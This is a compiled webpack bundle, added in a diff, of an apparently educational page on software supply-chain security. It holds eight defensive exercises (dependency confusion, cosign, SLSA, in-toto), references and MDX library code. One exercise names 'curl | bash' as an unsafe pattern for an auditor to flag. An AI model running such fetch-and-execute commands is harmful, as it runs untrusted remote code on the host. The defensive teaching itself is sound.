+          children: ["Add a rule to the auditor that checks for the use of ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "curl | bash"
+          }), " unsafe patterns."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Original (insecure) workflow, audit report, and fixed (hardened) workflow."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-3-dependency-confusion-defense",
+        children: "Exercise 3: Dependency Confusion Defense"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Scan a project for dependency confusion vulnerabilities and implement defenses."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Create a ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "package.json"
+          }), " with at least 3 \"private\" packages (e.g., ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "internal-auth"
+          }), ", ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "company-logger"
+          }), ", ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "secret-sauce"
+          }), ")."]
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Run the ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "DependencyConfusionScanner"
+          }), " against it."]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "For each CRITICAL finding, propose a remediation strategy."
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Implement a ", (0,jsx_runtime.jsx)(_components.code, {
+            children: ".npmrc"
+          }), " configuration that scopes all internal packages to a private registry."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Scan report + ", (0,jsx_runtime.jsx)(_components.code, {
+          children: ".npmrc"
+        }), " configuration + recommendations document."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-4-container-image-signing-and-verification",
+        children: "Exercise 4: Container Image Signing and Verification"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Implement a cosign-like verification workflow for container images."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Extend the ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "CosignVerifier"
+          }), " class to support:\n", (0,jsx_runtime.jsxs)(_components.ul, {
+            children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Multiple signature verification (key + keyless simultaneously)"
+            }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+              children: ["Policy enforcement using ", (0,jsx_runtime.jsx)(_components.code, {
+                children: "CosignPolicy"
+              }), " (check allowed identities)"]
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Signature expiry validation"
+            }), "\n"]
+          }), "\n"]
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Create a policy that only allows images signed by ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "dev@company.com"
+          }), " from issuer ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "https://accounts.google.com"
+          }), "."]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Test with a simulated image that has valid and invalid signatures."
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Policy-driven verification implementation with test cases."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-5-full-slsa-l3-pipeline-implementation",
+        children: "Exercise 5: Full SLSA L3 Pipeline Implementation"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Design and implement a complete SLSA L3-compliant pipeline configuration."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Create a GitHub Actions workflow that:\n", (0,jsx_runtime.jsxs)(_components.ul, {
+            children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Generates an SBOM (CycloneDX or SPDX)"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Runs dependency vulnerability scanning"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Signs the build artifact using Cosign (keyless)"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Builds a SLSA provenance attestation"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Runs container image scanning with Trivy"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Generates a signed DSSE envelope for the attestation"
+            }), "\n"]
+          }), "\n"]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Verify that the pipeline meets all SLSA L3 requirements."
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Add hermetic build verification (check that no network requests are made during build)."
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Full ", (0,jsx_runtime.jsx)(_components.code, {
+          children: ".github/workflows/slsa-l3.yml"
+        }), " pipeline + attestation output."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-6-vulnerability-scanning-automation",
+        children: "Exercise 6: Vulnerability Scanning Automation"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Build a vulnerability report aggregator across multiple dependency scanning tools."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Extend the ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "DependencyVulnerabilityChecker"
+          }), " to support:\n", (0,jsx_runtime.jsxs)(_components.ul, {
+            children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Multiple CVE database sources (NVD, OSV, GitHub Advisory Database)"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Severity score aggregation"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Auto-suggested fix versions with upgrade path analysis"
+            }), "\n"]
+          }), "\n"]
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Implement a ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "VulnerabilityReport"
+          }), " class that generates:\n", (0,jsx_runtime.jsxs)(_components.ul, {
+            children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "A human-readable markdown report"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "A machine-readable JSON report with CVE IDs"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "A dependency graph showing vulnerable paths"
+            }), "\n"]
+          }), "\n"]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Add transitive dependency vulnerability propagation (if library A depends on vulnerable library B, show the full path)."
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Vulnerability report generator with markdown and JSON output."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-7-package-manager-security-analysis",
+        children: "Exercise 7: Package Manager Security Analysis"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Implement a comprehensive package manager security scanner."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Create a ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "PackageSecurityScanner"
+          }), " that checks:\n", (0,jsx_runtime.jsxs)(_components.ul, {
+            children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Package age (packages < 30 days old are high risk)"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Number of maintainers (single maintainer is higher risk)"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Package download count and trend"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Last publish date (abandoned packages > 2 years)"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Presence of known typosquatting targets"
+            }), "\n"]
+          }), "\n"]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Implement a risk scoring algorithm (0–100) based on these factors."
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Test against 10 popular packages and 10 suspicious packages."
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Scanner implementation with risk scores and a report comparing legitimate vs. suspicious packages."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-8-in-toto-attestation-chain-verification",
+        children: "Exercise 8: in-toto Attestation Chain Verification"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Implement verification of an in-toto software supply chain attestation chain."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Create an ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "InTotoVerifier"
+          }), " class that:\n", (0,jsx_runtime.jsxs)(_components.ul, {
+            children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Parses multiple in-toto attestation links"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Verifies the chain of custody (developer → build → test → deploy)"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Validates signatures at each link"
+            }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+              children: "Reports any gaps or inconsistencies in the chain"
+            }), "\n"]
+          }), "\n"]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Simulate a complete attestation chain with 4 steps."
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Test a tampered chain where one link has been modified."
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Attestation chain verifier with test cases for valid and tampered chains."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "references",
+      children: "References"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "SolarWinds SUNBURST Attack Technical Analysis"
+        }), " — FireEye/Mandiant Report (2020)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Codecov Breach Analysis"
+        }), " — Trail of Bits (2021)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "CVE-2021-44228 (Log4Shell)"
+        }), " — Apache Foundation Advisory"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "SLSA Framework"
+        }), " — slsa.dev"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Sigstore/Cosign Documentation"
+        }), " — sigstore.dev"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "CycloneDX SBOM Standard"
+        }), " — cyclonedx.org (OWASP)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "SPDX SBOM Standard"
+        }), " — spdx.dev (Linux Foundation)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "TUF (The Update Framework)"
+        }), " — theupdateframework.io"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "in-toto Attestations"
+        }), " — in-toto.io"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "OWASP Dependency Check"
+        }), " — owasp.org/www-project-dependency-check/"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "GitHub Actions Security Hardening"
+        }), " — docs.github.com/en/actions/security-guides"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "NIST SP 800-204: Secure Software Development Framework"
+        }), " — NIST"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Google's SLSA Provenance Generator"
+        }), " — github.com/slsa-framework/slsa-github-generator"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Sigstore Fulcio"
+        }), " — sigstore.dev/fulcio (OIDC-based certificate authority)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Docker Content Trust / Notary"
+        }), " — docs.docker.com/engine/security/trust/"]
+      }), "\n"]
+    })]
+  });
+}
+function MDXContent(props = {}) {
+  const {wrapper: MDXLayout} = {
+    ...(0,lib/* useMDXComponents */.R)(),
+    ...props.components
+  };
+  return MDXLayout ? (0,jsx_runtime.jsx)(MDXLayout, {
+    ...props,
+    children: (0,jsx_runtime.jsx)(_createMdxContent, {
+      ...props
+    })
+  }) : _createMdxContent(props);
+}
+
+
+
+/***/ },
+
+/***/ 28453
+(__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) {
+
+/* harmony export */ __webpack_require__.d(__webpack_exports__, {
+/* harmony export */   R: () => (/* binding */ useMDXComponents),
+/* harmony export */   x: () => (/* binding */ MDXProvider)
+/* harmony export */ });
+/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(96540);
+/**
+ * @import {MDXComponents} from 'mdx/types.js'
+ * @import {Component, ReactElement, ReactNode} from 'react'
+ */
+
+/**
+ * @callback MergeComponents
+ *   Custom merge function.
+ * @param {Readonly<MDXComponents>} currentComponents
+ *   Current components from the context.
+ * @returns {MDXComponents}
+ *   Additional components.
+ *
+ * @typedef Props
+ *   Configuration for `MDXProvider`.
+ * @property {ReactNode | null | undefined} [children]
+ *   Children (optional).
+ * @property {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
+ *   Additional components to use or a function that creates them (optional).
+ * @property {boolean | null | undefined} [disableParentContext=false]
+ *   Turn off outer component context (default: `false`).
+ */
+
+
+
+/** @type {Readonly<MDXComponents>} */
+const emptyComponents = {}
+
+const MDXContext = react__WEBPACK_IMPORTED_MODULE_0__.createContext(emptyComponents)
+
+/**
+ * Get current components from the MDX Context.
+ *
+ * @param {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
+ *   Additional components to use or a function that creates them (optional).
+ * @returns {MDXComponents}
+ *   Current components.
+ */
+function useMDXComponents(components) {
+  const contextComponents = react__WEBPACK_IMPORTED_MODULE_0__.useContext(MDXContext)
+
+  // Memoize to avoid unnecessary top-level context changes
+  return react__WEBPACK_IMPORTED_MODULE_0__.useMemo(
+    function () {
+      // Custom merge via a function prop
+      if (typeof components === 'function') {
+        return components(contextComponents)
+      }
+
+      return {...contextComponents, ...components}
+    },
+    [contextComponents, components]
+  )
+}
+
+/**
+ * Provider for MDX context.
+ *
+ * @param {Readonly<Props>} properties
+ *   Properties.
+ * @returns {ReactElement}
+ *   Element.
+ * @satisfies {Component}
+ */
+function MDXProvider(properties) {
+  /** @type {Readonly<MDXComponents>} */
+  let allComponents
+
+  if (properties.disableParentContext) {
+    allComponents =
+      typeof properties.components === 'function'
+        ? properties.components(emptyComponents)
+        : properties.components || emptyComponents
+  } else {
+    allComponents = useMDXComponents(properties.components)
+  }
+
+  return react__WEBPACK_IMPORTED_MODULE_0__.createElement(
+    MDXContext.Provider,
+    {value: allComponents},
+    properties.children
+  )
+}
+
+
+/***/ }
+
+}]);
